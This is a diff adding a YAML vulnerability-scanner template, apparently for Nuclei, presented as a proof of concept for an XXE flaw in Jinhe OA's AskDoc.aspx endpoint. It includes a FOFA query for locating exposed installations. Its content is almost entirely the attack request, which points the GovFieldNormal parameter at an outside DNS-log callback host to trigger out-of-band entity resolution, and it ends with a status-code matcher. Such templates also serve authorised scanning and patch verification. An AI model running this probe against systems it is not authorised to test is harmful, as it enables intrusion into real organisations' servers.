@@ -1,0 +1,21 @@
+id: poc-iw736go8ys78y3cl
+info:
+  name: 金和OA AskDoc.aspx 存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iw736go8ys78y3cl'
+  tags: xxe,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iw736go8ys78y3cl
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /c6/Jhsoft.Web.Ask/AskDoc.aspx/?GovFieldNormal=http://xxe.dnslog.pt/ HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
